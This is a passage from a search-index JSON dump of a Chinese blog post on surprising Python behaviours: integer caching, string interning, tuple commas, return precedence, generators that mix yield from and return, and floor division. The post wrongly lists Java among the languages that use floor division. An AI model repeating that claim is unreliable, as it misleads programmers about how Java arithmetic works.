<pre><code>a, b, c = [], [], []\n</code></pre>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#python","title":"\u4e09\u3001Python \u5185\u5b58\u7ba1\u7406","text":"","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#31","title":"3.1 \u6574\u6570\u7f13\u51b2\u533a\u5e26\u6765\u7684\u6574\u6570\u53d8\u91cf\u5730\u5740\u95ee\u9898","text":"<p>\u4f7f\u7528\u4f60\u7684\u4ea4\u4e92\u5f0f Python \u89e3\u91ca\u5668\uff08\u4e0d\u8981\u4f7f\u7528 PyCharm \u90a3\u4e2a Python \u63a7\u5236\u53f0\uff09\uff0c\u590d\u5236\u8fdb\u4ee5\u4e0b\u4ee3\u7801\uff1a</p> <pre><code>a = 1\nb = 1\nprint(id(a))  # 1986116387056\nprint(id(b))  # 1986116387056\n</code></pre> <pre><code>a = 1000000\nb = 1000000\nprint(id(a))  # 2119149214224\nprint(id(b))  # 2119149214384\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u4f1a\u4e0d\u4e00\u6837\uff1f\u8fd9\u662f\u56e0\u4e3a Python \u89e3\u91ca\u5668\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u5e38\u7528\u7684\u6574\u6570\uff0c\u4f1a\u9884\u5148\u521b\u5efa\u597d\uff0c\u653e\u5728\u4e00\u4e2a\u6574\u6570\u7f13\u51b2\u533a\u4e2d\uff0c\u5f53\u4f60\u9700\u8981\u4f7f\u7528\u8fd9\u4e9b\u6574\u6570\u65f6\uff0c\u76f4\u63a5\u4ece\u7f13\u51b2\u533a\u4e2d\u53d6\u51fa\u6765\u4f7f\u7528\uff0c\u800c\u4e0d\u662f\u91cd\u65b0\u521b\u5efa\u3002</p> <p>\u8fd9\u4e9b\u88ab\u7f13\u5b58\u7684\u6574\u6570\u7684\u8303\u56f4\u662f <code>-5</code> \u5230 <code>256</code>\u3002</p> <p>\u6ce8\u610f</p> <p>\u5982\u679c\u4f60\u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u5b58\u5230 <code>.py</code> \u6587\u4ef6\u91cc\uff0c\u518d\u4f7f\u7528 <code>python</code> \u547d\u4ee4\u8fd0\u884c\uff0c\u5219\u53ef\u80fd\u4e0d\u4f1a\u4ea7\u751f\u9884\u671f\u7684\u7ed3\u679c\u2014\u2014\u5373\u671f\u671b\u4e24\u4e2a\u5927\u6570\u7684 <code>id</code> \u4e0d\u540c\u3002\u8fd9\u662f\u56e0\u4e3a Python \u89e3\u91ca\u5668\u5728\u8fd0\u884c\u65f6\uff0c\u4f1a\u5c06\u4ee3\u7801\u7f16\u8bd1\u6210\u5b57\u8282\u7801\uff0c\u7136\u540e\u518d\u6267\u884c\u5b57\u8282\u7801\u3002\u800c\u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\uff0cPython \u4f1a\u81ea\u52a8\u5bf9\u4ee3\u7801\u8fdb\u884c\u4f18\u5316\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#32","title":"3.2 \u5b57\u7b26\u4e32\u5185\u5b58\u91cd\u7528","text":"<p>\u548c\u4e0a\u4e00\u5c0f\u8282\u4e00\u6837\uff0c\u8bf7\u4f7f\u7528\u4f60\u7684\u4ea4\u4e92\u5f0f Python \u89e3\u91ca\u5668\u8fd0\u884c\uff1a</p> <pre><code>a = 'hello'\nb = 'hello'\nprint(id(a))  # 2110320773168\nprint(id(b))  # 2110320773168\n</code></pre> <pre><code>a = 'hello!'\nb = 'hello!'\nprint(id(a))  # 2119149796272\nprint(id(b))  # 2119149796336\n</code></pre> <p>\u5b83\u7684\u5177\u4f53\u5b9e\u73b0\u53ef\u4ee5\u770b Intern selected string constants\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u5b83\u4f7f\u7528\u4e86 <code>all_name_chars()</code> \u6765\u68c0\u67e5\u5b57\u7b26\u4e32\u7684\u6bcf\u4e00\u4e2a\u5b57\u7b26\uff0c\u540e\u8005\u5b9e\u9645\u4e0a\u5c06\u4f1a\u5bf9\u6240\u6709 \u80fd\u6784\u6210\u6807\u8bc6\u7b26\u7684\u5b57\u7b26\uff08\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\uff09\u8fd4\u56de <code>true</code>\u3002</p> <p>\u4e2a\u4eba\u63a8\u6d4b\u8fd9\u662f\u4e3a\u4e86\u4f18\u5316 <code>__getattr__()</code>\u3001<code>__setattr__()</code> \u8fd9\u4e24\u4e2a\u9b54\u6cd5\u65b9\u6cd5\u7684\u8c03\u7528\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u65b9\u6cd5\u7684\u53c2\u6570\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u8fd9\u4e9b\u5b57\u7b26\u4e32\u7edd\u5bf9\u90fd\u662f\u6807\u8bc6\u7b26\uff0c\u5982\u679c\u4e0d\u505a\u8fd9\u4e2a\u4f18\u5316\uff0c\u90a3\u4e48\u6bcf\u6b21\u8c03\u7528\u8fd9\u4e9b\u65b9\u6cd5\u65f6\uff0c\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\u5bf9\u8c61\uff0c\u8fd9\u6837\u4f1a\u9020\u6210\u5927\u91cf\u7684\u5185\u5b58\u6d6a\u8d39\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#33","title":"3.3 \u5185\u5b58\u6cc4\u9732\u4e0e\u5f15\u7528\u8ba1\u6570","text":"<p>TODO</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#_3","title":"\u56db\u3001\u4ee3\u7801\u7ec6\u8282","text":"","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#41","title":"4.1 \u7a7a\u62ec\u53f7\u91cc\u7684\u9017\u53f7","text":"<p>\u8003\u8651\u4ee5\u4e0b\u4e24\u6bb5\u4ee3\u7801\uff1a</p> <pre><code>a = (1,)\nprint(type(a))  # &lt;class 'tuple'&gt;\n</code></pre> <pre><code>a = (1)\nprint(type(a))  # &lt;class 'int'&gt;\n</code></pre> <p>\u5bf9\u4e8e\u524d\u8005\uff0c<code>a</code> \u5bf9\u8c61\u7684\u7c7b\u578b\u662f <code>tuple</code>\uff0c\u800c\u5bf9\u4e8e\u540e\u8005\uff0c\u5b83\u7684\u7c7b\u578b\u662f <code>int</code>\u3002\u533a\u522b\u5c31\u5728\u4e8e\u90a3\u4e2a\u9017\u53f7\u3002</p> <p>\u5e9f\u8bdd\u4e0d\u591a\u8bf4\u76f4\u63a5\u770b \u6587\u6863\uff1a</p> <p>\u5143\u7ec4\u548c\u5e8f\u5217</p> <p>\u6784\u9020 0 \u4e2a\u6216 1 \u4e2a\u5143\u7d20\u7684\u5143\u7ec4\u6bd4\u8f83\u7279\u6b8a\uff1a\u4e3a\u4e86\u9002\u5e94\u8fd9\u79cd\u60c5\u51b5\uff0c\u5bf9\u53e5\u6cd5\u6709\u4e00\u4e9b\u989d\u5916\u7684\u6539\u53d8\u3002\u7528\u4e00\u5bf9\u7a7a\u5706\u62ec\u53f7\u5c31\u53ef\u4ee5\u521b\u5efa\u7a7a\u5143\u7ec4\uff1b\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u7684\u5143\u7ec4\u53ef\u4ee5\u901a\u8fc7\u5728\u8fd9\u4e2a\u5143\u7d20\u540e\u6dfb\u52a0\u9017\u53f7\u6765\u6784\u5efa\uff08\u5706\u62ec\u53f7\u91cc\u53ea\u6709\u4e00\u4e2a\u503c\u7684\u8bdd\u4e0d\u591f\u660e\u786e\uff09\u3002\u4e11\u964b\uff0c\u4f46\u662f\u6709\u6548\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#42-return","title":"4.2 <code>return</code> \u8bed\u53e5\u7684\u7b97\u672f\u4f18\u5148\u7ea7","text":"<p>\u8003\u8651\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u6cd5\u53ef\u80fd\u8fd4\u56de\u7684\u7ed3\u679c\uff1a</p> <pre><code>def foo(self) -&gt; tuple[int, int]:\n    return (0, 0) if 'noinput' in self.type_list else super().foo()\n</code></pre> <pre><code>def foo(self) -&gt; tuple[int, int]:\n    return 0, 0 if 'noinput' in self.type_list else super().foo()\n</code></pre> <p>\u8fd9\u662f\u6211\u66fe\u7ecf\u5236\u9020\u7684 \u5de8\u5927 bug \u4e4b\u4e00\u3002\u8fd9\u4e24\u4e2a\u4f8b\u5b50\u90fd\u4f7f\u7528\u4e86\u4e00\u4e2a\u4e09\u76ee\u8fd0\u7b97\u7b26\uff0c\u5e76\u4e14\u8fd4\u56de\u7ed3\u679c\u90fd\u662f\u4e00\u4e2a\u5143\u7ec4\u3002\u4ed6\u4eec\u91cd\u5199\u4e86\u7236\u7c7b\u7684 <code>foo()</code> \u65b9\u6cd5\uff0c\u800c\u663e\u7136\u7236\u7c7b\u7684 <code>foo()</code> \u65b9\u6cd5\u5c06\u4f1a\u8fd4\u56de\u4e00\u4e2a <code>tuple[int, int]</code> \u7c7b\u578b\u3002</p> <p>\u7136\u800c\u4e0d\u5e78\u7684\u662f\uff0c<code>return</code> \u8bed\u53e5\u7684\u4f18\u5148\u7ea7\u6bd4 <code>if</code> \u8bed\u53e5\u7684\u4f18\u5148\u7ea7\u8981\u4f4e\uff0c\u8fd9\u5c31\u5bfc\u81f4\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u4f1a\u4f18\u5148\u8ba1\u7b97\u9017\u53f7\u4e4b\u540e\u7684 <code>0 if 'noinput' in self.type_list else super().foo()</code>\uff0c\u6211\u4eec\u5047\u8bbe\u8fd9\u4e2a\u7ed3\u679c\u662f <code>XXXX</code>\uff0c\u7136\u540e\u89e3\u91ca\u5668\u518d\u6267\u884c <code>return 0, XXXX</code>\u3002</p> <p>\u800c\u663e\u7136\u8fd9\u4e2a <code>XXXX</code> \u8981\u4e48\u662f <code>0</code>\uff0c\u8981\u4e48\u662f\u4ece\u7236\u7c7b\u7684 <code>foo()</code> \u65b9\u6cd5\u8fd4\u56de\u7684 <code>tuple[int, int]</code> \u7c7b\u578b\u7684\u5bf9\u8c61\u3002\u5982\u679c\u662f <code>0</code> \u8fd8\u597d\uff0c\u5b50\u7c7b\u7684\u8fd4\u56de\u7ed3\u679c\u5c06\u4ecd\u7136\u4f1a\u662f <code>(0, 0)</code>\u3002\u4f46\u662f\u5982\u679c\u8fd9\u4e2a <code>XXXX</code> \u662f\u4ece\u7236\u7c7b\u8fd4\u56de\u7684 <code>tuple[int, int]</code> \u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u5b50\u7c7b\u7684\u8fd4\u56de\u7ed3\u679c\u5c31\u4f1a\u662f <code>tuple[int, tuple[int, int]]</code>\uff0c\u8fd9\u663e\u7136\u662f\u4e0d\u7b26\u5408\u9884\u671f\u7684\u3002</p> <p>\u89e3\u51b3\u529e\u6cd5\u5c31\u662f\u5728 <code>return</code> \u8bed\u53e5\u91cc\u4e3a\u90a3\u4e2a\u5143\u7ec4\u52a0\u4e0a\u62ec\u53f7\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#43-yield-from-return","title":"4.3 <code>yield from</code> \u548c <code>return</code> \u5171\u5b58","text":"<p>\u8003\u8651\u4ee5\u4e0b\u4e24\u6bb5\u4ee3\u7801\uff0c</p> <pre><code>def my_range(a):\n    if a &lt; 0:\n        yield from (-x for x in range(-a))\n    yield from (x for x in range(a))\n</code></pre> <pre><code>def my_range(a):\n    if a &lt; 0:\n        yield from (-x for x in range(-a))\n    return (x for x in range(a))\n</code></pre> <p>\u4e0a\u9762\u8fd9\u4e24\u4e2a\u4f8b\u5b50\u662f\uff0c\u6211\u60f3\u6784\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684 <code>range()</code>\uff0c\u53eb\u505a <code>my_range()</code>\uff0c\u5165\u53c2\u5982\u679c\u662f\u8d1f\u6570\u7684\u8bdd\uff0c\u5c31\u4ece <code>0</code> \u5f80\u8d1f\u6570\u65b9\u5411\u8fed\u4ee3\u3002</p> <p>\u6211\u8d4c\u4e94\u6bdb\u94b1\uff0c\u5373\u4f7f\u662f\u6709\u7ecf\u9a8c\u7684\u5f00\u53d1\u8005\u4e5f\u4f1a\u89c9\u5f97\u8fd9\u4e24\u6bb5\u4ee3\u7801\u662f\u7b49\u4ef7\u7684\u3002</p> <p>\u771f\u7684\u662f\u8fd9\u6837\u5417\uff1f\u4e14\u4e0d\u8bf4\u7ed3\u8bba\uff0c\u6211\u4eec\u5148\u770b\u770b\u8fd9\u4e24\u6bb5\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\uff1a</p> <p>\u9996\u5148\u662f\u7b2c\u4e00\u4e2a\u51fd\u6570\uff1a</p> <pre><code>def my_range(a):\n    if a &lt; 0:\n        yield from (-x for x in range(-a))\n    yield from (x for x in range(a))\n\nprint(list(my_range(5)))  # [0, 1, 2, 3, 4]\nprint(list(my_range(-5)))  # [0, -1, -2, -3, -4]\n</code></pre> <p>\u5b8c\u5168\u6ca1\u6709\u95ee\u9898\uff0c\u5b8c\u5168\u7b26\u5408\u9884\u671f\u3002</p> <p>\u90a3\u4e48\u7b2c\u4e8c\u4e2a\u51fd\u6570\uff1a</p> <pre><code>def my_range(a):\n    if a &lt; 0:\n        yield from (-x for x in range(-a))\n    return (x for x in range(a))\n\nprint(list(my_range(5)))  # []\nprint(list(my_range(-5)))  # [0, -1, -2, -3, -4]\n</code></pre> <p>\uff1f\uff1f\uff1f</p> <p>\u6211\u4eec\u770b\u5230\u4e86 <code>my_range(5)</code> \u7684\u6267\u884c\u7ed3\u679c\u7684\u4e0d\u540c\uff1a\u4f7f\u7528 <code>yield from</code> \u8bed\u53e5\u7684\u51fd\u6570\u8fd4\u56de\u7684\u751f\u6210\u5668\u53ef\u4ee5\u6b63\u5e38\u5730\u50cf <code>range(5)</code> \u4e00\u6837\u8fed\u4ee3\uff0c\u800c\u4f7f\u7528 <code>return</code> \u8bed\u53e5\u7684\u51fd\u6570\u8fd4\u56de\u7684\u751f\u6210\u5668\u5374\u662f\u4e2a\u7a7a\u7684\u3002\u90a3\u6211\u4eec\u7684 <code>return (x for x in range(a))</code> \u8fd4\u56de\u5230\u54ea\u91cc\u53bb\u4e86\u5462\uff1f</p> <p>\u522b\u6025\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 <code>try</code> \u4e2d\u627e\u5230\u5b83\uff1a</p> <pre><code>try:\n    next(my_range(-5))\nexcept StopIteration as e:\n    print(type(e.value))  # &lt;class 'generator'&gt;\n    print(list(e.value))  # [0, -1, -2, -3, -4]\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\uff0c<code>return (x for x in range(a))</code> \u8fd4\u56de\u7684\u751f\u6210\u5668\u88ab\u9001\u5230\u4e86 <code>StopIteration</code> \u5f02\u5e38\u7684 <code>value</code> \u5c5e\u6027\u4e2d\u3002</p> <p>\u4e3a\u4e86\u89e3\u91ca\u8fd9\u4e2a\u73b0\u8c61\uff0c\u6211\u4eec\u9996\u5148\u5fc5\u987b\u4e86\u89e3\u4e00\u70b9\uff1a\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u91cc\u5305\u542b <code>yield</code> \u5173\u952e\u5b57\uff08\u5305\u62ec <code>yield from</code>\uff09\uff0c\u65e0\u8bba\u8fd9\u4e2a <code>yield</code> \u5728\u54ea\uff0c\u6709\u6ca1\u6709\u673a\u4f1a\u88ab\u6267\u884c\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6c38\u8fdc\u662f\u751f\u6210\u5668\uff0c\u4f8b\u5982\uff1a</p> <pre><code>def foo():\n    if True:\n        return 1\n    else:\n        yield from ()\n\nprint(type(foo()))  # &lt;class 'generator'&gt;\n</code></pre> <p>\u8fd9\u91cc\u7684 <code>yield from ()</code> \u8bed\u53e5\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u6267\u884c\uff0c\u751a\u81f3\u770b\u4e0a\u53bb\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u7c7b\u578b\u5e94\u8be5\u662f <code>int</code>\uff0c\u4f46\u662f <code>foo()</code> \u7684\u8fd4\u56de\u503c\u4ecd\u7136\u662f\u751f\u6210\u5668\u3002</p> <p>\u65e2\u7136\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u751f\u6210\u5668\uff0c\u90a3\u4e48\u8be5\u751f\u6210\u5668\u5fc5\u987b\u6307\u5b9a\u4e00\u4e2a\u8fed\u4ee3\u7ed3\u675f\u6807\u5fd7\uff0c\u5373\u5728\u8fed\u4ee3\u7ed3\u675f\u65f6\u629b\u51fa <code>StopIteration</code> \u5f02\u5e38\uff0c\u610f\u4e3a\u4e0d\u80fd\u4ea7\u751f\u4e0b\u4e00\u9879\u3002\u4efb\u4f55\u4e00\u4e2a\u89c4\u8303\u7684\u8fed\u4ee3\u5668\uff08\u751f\u6210\u5668\uff09\u5728\u8fed\u4ee3\u7ed3\u675f\u65f6\u90fd\u5c06\u629b\u51fa <code>StopIteration</code> \u5f02\u5e38\uff0c\u5e76\u7531\u8c03\u7528\u8005\u5904\u7406\uff0c\u4f8b\u5982\u6211\u4eec\u7684 <code>(x for x in range(a))</code> \u751f\u6210\u5668\u8868\u8fbe\u5f0f\u3002</p> <p>\u800c\u5982\u679c\u5728\u751f\u6210\u5668\u51fd\u6570\u4e2d\u5f3a\u884c <code>return</code>\uff0c\u8fd9\u610f\u5473\u7740\u8fed\u4ee3\u8fc7\u7a0b\u5c06\u88ab\u63d0\u524d\u7ed3\u675f\uff0c\u4e8e\u662f\u6211\u4eec\u672c\u8f6e\u8fed\u4ee3\u6210\u4e3a\u4e86\u6700\u540e\u4e00\u8f6e\u8fed\u4ee3\uff0c\u7531\u4e8e\u6b64\u5904\u4f7f\u7528\u4e86 <code>return</code> \u53d6\u4ee3 <code>yield</code>\uff0c\u6545\u8c03\u7528\u8005\u65e0\u6cd5\u83b7\u53d6\u6700\u540e\u4e00\u8f6e\u8fed\u4ee3\u7684\u7ed3\u679c\uff08\u8c03\u7528\u8005\u53ea\u80fd\u4ece <code>yield</code> \u83b7\u77e5\u8fed\u4ee3\u7ed3\u679c\uff09\u3002</p> <p>\uff08\u8bf7\u6ce8\u610f\uff1a\u51fd\u6570\u4e2d\u6267\u884c\u5230 <code>return</code> \u610f\u5473\u7740\u51fd\u6570\u5fc5\u987b\u7acb\u5373\u7ed3\u675f\u6216\u6267\u884c <code>finally</code> \u8bed\u53e5\u5757\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\uff0c\u5373\u4fbf\u8fd9\u662f\u4e00\u4e2a\u751f\u6210\u5668\u51fd\u6570\uff09</p> <p>\u539f\u5219\u4e0a\u6b64\u65f6\u5e94\u8be5\u629b\u51fa <code>StopIteration</code> \u5f02\u5e38\u901a\u77e5\u751f\u6210\u5668\u7684\u8c03\u7528\u8005\u8be5\u8fed\u4ee3\u8fc7\u7a0b\u5df2\u7ecf\u7ed3\u675f\u3002\u96ea\u4e0a\u52a0\u971c\u7684\u662f\uff0c<code>return</code> \u4e4b\u540e\u6ca1\u6709\u4efb\u4f55\u53ef\u80fd\u6765\u629b\u51fa\u4e00\u4e2a <code>StopIteration</code> \u5f02\u5e38\u3002\u56e0\u6b64\u5728\u8fd9\u79cd\u590d\u6742\u60c5\u51b5\u4e0b\uff0c\u89e3\u91ca\u5668\u4f1a\u66ff\u6211\u4eec\u629b\u51fa\u4e00\u4e2a <code>StopIteration</code> \u5f02\u5e38\uff0c\u51fd\u6570\u8fd4\u56de\u7684\u503c\u5c06\u88ab\u7528\u4f5c\u5f02\u5e38\u6784\u9020\u5668\u7684 <code>value</code> \u5f62\u53c2\u3002</p> <p>\u89c1 \u6587\u6863\uff1a</p> <p>exception StopIteration</p> <p>\u5f53\u4e00\u4e2a <code>generator</code> \u6216 <code>coroutine</code> \u51fd\u6570\u8fd4\u56de\u65f6\uff0c\u5c06\u5f15\u53d1\u4e00\u4e2a\u65b0\u7684 <code>StopIteration</code> \u5b9e\u4f8b\uff0c\u51fd\u6570\u8fd4\u56de\u7684\u503c\u5c06\u88ab\u7528\u4f5c\u5f02\u5e38\u6784\u9020\u5668\u7684 <code>value</code> \u5f62\u53c2\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u89e3\u91ca <code>return</code> \u65f6\u53d1\u751f\u4e86\u4ec0\u4e48\u4e86\uff1a\u7531\u4e8e\u51fd\u6570\u4e2d\u5305\u542b <code>yield</code> \u5173\u952e\u5b57\uff0c\u6545\u89e3\u91ca\u5668\u8ba4\u4e3a\u8be5\u51fd\u6570\u6c38\u8fdc\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u751f\u6210\u5668\u3002\u5f53\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 <code>return XXXX</code> \u8bd5\u56fe\u4ee5 <code>XXXX</code> \u4f5c\u4e3a\u8fd4\u56de\u7ed3\u679c\u65f6\uff08\u65e0\u8bba <code>XXXX</code> \u662f\u4f55\u79cd\u7c7b\u578b\uff09\uff0c\u89e3\u91ca\u5668\u4f1a\u8ba4\u4e3a\u8be5\u751f\u6210\u5668\u63d0\u524d\u7ed3\u675f\uff0c\u5e76\u66ff\u6211\u4eec\u629b\u51fa\u4e00\u4e2a <code>StopIteration</code> \u5f02\u5e38\uff0c\u5c06 <code>XXXX</code> \u7684\u503c\u4fdd\u5b58\u5728\u5f02\u5e38\u5b9e\u4f8b\u7684 <code>value</code> \u5c5e\u6027\u4e2d\u3002</p> <p>\u540c\u65f6\uff0c\u5bf9\u8c03\u7528\u8005\u800c\u8a00\uff0c\u5b83\u83b7\u53d6\u7684\u8fed\u4ee3\u7ed3\u679c\u662f\u5728 <code>return XXXX</code> \u8bed\u53e5\u4e4b\u524d\u6240\u6709\u901a\u8fc7 <code>yield</code> \u4ea7\u751f\u7684\u7ed3\u679c\u3002\u5728\u6211\u4eec\u7684\u7b2c\u4e8c\u4e2a <code>my_range()</code> \u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u6ca1\u6709\u901a\u8fc7 <code>yield</code> \u4ea7\u751f\u4efb\u4f55\u503c\u5c31\u76f4\u63a5 <code>return</code> \u4e86\uff0c\u56e0\u6b64\u8c03\u7528\u8005\u83b7\u5f97\u7684\u5c31\u662f\u4e00\u4e2a\u7a7a\u7684\u751f\u6210\u5668\u3002</p> <p>\u8fd9\u4e2a <code>return XXXX</code> \u8bed\u53e5\u5c31\u50cf\u4e00\u4e2a\u5c0f\u4e11\ud83e\udd21\u4e00\u6837\uff0c\u5b83\u60f3\u8ba9 <code>XXXX</code> \u4f5c\u4e3a\u5b83\u6240\u5728\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u53ef\u672a\u66fe\u60f3\u5230\u89e3\u91ca\u5668\u53ea\u662f\u5c06\u8fd9\u4e2a\u53ef\u601c\u7684\u503c\u5206\u914d\u7ed9\u4e86\u4e00\u4e2a\u5f02\u5e38\u5b9e\u4f8b\u7684\u4e00\u4e2a\u5c5e\u6027\u3002\u800c\u540c\u5904\u4e00\u4e2a\u5c4b\u6a90\u4e0b\u7684 <code>yield</code> \u5236\u9020\u7684\u6bcf\u4e00\u4e2a\u503c\uff0c\u90fd\u4f1a\u88ab\u51fd\u6570\u7684\u8c03\u7528\u8005\u5168\u76d8\u63a5\u7eb3\u3002\u751a\u81f3\u5f53 <code>yield</code> \u65e0\u6cd5\u88ab\u6267\u884c\u4ee5\u81f3\u4e8e\u5b83\u65e0\u6cd5\u5236\u9020\u4efb\u4f55\u503c\u65f6\uff0c\u89e3\u91ca\u5668\u5b81\u53ef\u4e3a\u8c03\u7528\u8005\u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684\u751f\u6210\u5668\uff0c\u4e5f\u4e0d\u613f\u610f\u5c06 <code>return</code> \u7684\u503c\u4ea4\u7ed9\u8c03\u7528\u8005\u3002\u800c\u9020\u6210\u8fd9\u4e00\u5207\u7684\uff0c\u4ec5\u4ec5\u662f\u8fd9\u4e2a\u51fd\u6570\u4e2d\u5b58\u5728\u4e00\u4e2a <code>yield</code> \u5173\u952e\u5b57\ud83d\udc94\u3002</p> <p>\u8fd9\u540c\u6837\u4e5f\u662f\u6211\u66fe\u7ecf\u5236\u9020\u7684 \u5de8\u5927 bug \u4e2d\u7684\u4e00\u4e2a\u3002</p> <p></p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#_4","title":"\u4e94\u3001\u8fd0\u7b97\u7b26","text":"","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#51","title":"5.1 \u6b63\u8d1f\u6570\u5728\u6574\u6570\u9664\u6cd5\u4e2d\u6c42\u5546\u7684\u4e0d\u540c\u53ca\u5176\u4f59\u6570\u7684\u503c","text":"<p>\u5148\u8bf4\u7ed3\u8bba\uff1a\u8fd0\u7b97\u7ed3\u679c\u603b\u662f\u5411\u8d1f\u65e0\u7a77\u7684\u65b9\u5411\u820d\u5165\u3002</p> <pre><code>print(7 / 3)  # 2.3333333333333335\nprint(7 // 3)  # 2\nprint(7 % 3)  # 1\n</code></pre> <pre><code>print((-7) / 3)  # -2.3333333333333335\nprint((-7) // 3)  # -3\nprint((-7) % 3)  # 2\n</code></pre> <p>\u4f55\u4e3a\u820d\u5165\u89c4\u5219\uff1f\u820d\u5165\u89c4\u5219\u662f\u6307\u5728\u6574\u6570\u9664\u6cd5\u4e2d\uff0c\u5f53\u5546\uff08\u6682\u65f6\u89c6\u4e3a\u6d6e\u70b9\u6570\uff09\u4e3a\u8d1f\u6570\u65f6\uff0c\u5bf9\u4e8e\u5546\u7684\u53d6\u6574\u7684\u4e0d\u540c\u505a\u6cd5\u3002\u5728 Python \u4e2d\u91c7\u7528\u5411\u4e0b\u53d6\u6574\u3002</p> <p></p> <p>\u51e0\u4e4e\u6240\u6709\u7684\u8ba1\u7b97\u7cfb\u7edf\u4e2d\uff0c\\(a\\) \u9664\u4ee5 \\(n\\) \u5f97\u5230\u5546 \\(q\\) \u548c\u4f59\u6570 \\(r\\) \u5747\u6ee1\u8db3\u4ee5\u4e0b\u5f0f\u5b50\uff1a</p> \\[ q\\in Z, a = n q + r, |r| &lt; |n| \\] <p>\u53f3\u8fb9\u662f\ud83d\udd34\u5546\uff08\\(q\\)\uff09\u548c\ud83d\udfe2\u4f59\u6570\uff08\\(r\\)\uff09\u4f5c\u4e3a\u88ab\u9664\u6570\uff08\\(a\\)\uff09\u7684\u51fd\u6570\u65f6\u7684\u56fe\u50cf\u3002\u5de6\u4fa7\u662f\u9664\u6570\u4e3a\u6b63\u7684\u60c5\u51b5\uff0c\u53f3\u4fa7\u9664\u6570\u4e3a\u8d1f\u3002\u4ece\u4e0a\u81f3\u4e0b\u5206\u522b\u4f7f\u7528\u4e86\uff1a\u5411\u96f6\u53d6\u6574\u3001\u5411\u4e0b\u53d6\u6574\u548c\u6b27\u51e0\u91cc\u5fb7\u9664\u6cd5\u3002</p> <p>\u4ee5\u4e0a\u9762\u7684\u4f8b\u5b50\u4e3a\u4f8b\uff0c\u5f53\u8ba1\u7b97 <code>-7 // 3</code> \u65f6\uff0c\u76f4\u63a5\u8ba1\u7b97\u5f97 <code>-2.333</code>\uff0c\u6839\u636e\u5411\u4e0b\u53d6\u6574\u5c06\u5176\u820d\u5165\u4e3a <code>-3</code>\uff0c\u6545 <code>-7 // 3 == -3</code>\u3002\u7531\u4e8e <code>(-3) * 3 + 2 == -7</code>\uff0c\u6545 <code>-7 % 3 == 2</code>\u3002Python\u3001Java\u3001Ruby\u3001Mathematica \u548c MATLAB \u7b49\u91c7\u7528\u7684\u5c31\u662f\u8fd9\u79cd\u65b9\u5f0f\u3002</p> <p>\u5728 C\u3001C#\u3001Go \u548c Kotlin \u7b49\u8bed\u8a00\u4e2d\uff0c\u4f7f\u7528\u7684\u662f\u5411\u96f6\u53d6\u6574\uff08\u53c8\u79f0\u4e3a\u622a\u65ad\u9664\u6cd5\uff09\uff0c\u5373\u653e\u5f03\u5c0f\u6570\u4f4d\uff0c\u5f53\u8ba1\u7b97 <code>-7 // 3</code> \u65f6\uff0c\u5c06\u6d6e\u70b9\u5546 <code>-2.333</code> \u820d\u5165\u4e3a <code>-2</code>\uff0c\u6545 <code>-7 // 3 == -2</code>\u3002\u7531\u4e8e <code>(-2) * 3 + 1 == -7</code>\uff0c\u6545 <code>-7 % 3 == 1</code>\u3002</p> <p>\u6bcf\u4e2a\u8bed\u8a00\u7684\u8bbe\u8ba1\u8005\u90fd\u53ef\u4ee5\u81ea\u7531\u5730\u9009\u62e9\u81ea\u5df1\u7684\u820d\u5165\u89c4\u5219\uff0c\u4ece\u800c\u4f7f\u8ba1\u7b97\u7ed3\u679c\u4e94\u82b1\u516b\u95e8\u3002\u5728\u6574\u6570\u9664\u6cd5\u4e2d\u7531\u4e8e\u820d\u5165\u89c4\u5219\u7684\u4e0d\u540c\u800c\u5bfc\u81f4\u7684\u8fd9\u79cd\u5947\u8469\u73b0\u8c61\uff0c\u4e5f\u53ef\u4ee5\u7b49\u4ef7\u5730\u770b\u4f5c\u53e6\u4e00\u4e2a\u95ee\u9898\uff0c\u5373\u2014\u2014\u4e0d\u540c\u7f16\u7a0b\u8bed\u8a00\u4e0b\u6574\u6570\u53d6\u6a21\u8fd0\u7b97\u7684\u7b26\u53f7\u662f\u8ddf\u968f\u88ab\u9664\u6570\u8fd8\u662f\u9664\u6570\u3002\u7ea6\u56db\u6210\u7684\u7f16\u7a0b\u8bed\u8a00\u53d6\u6a21\u7ed3\u679c\u4e0e\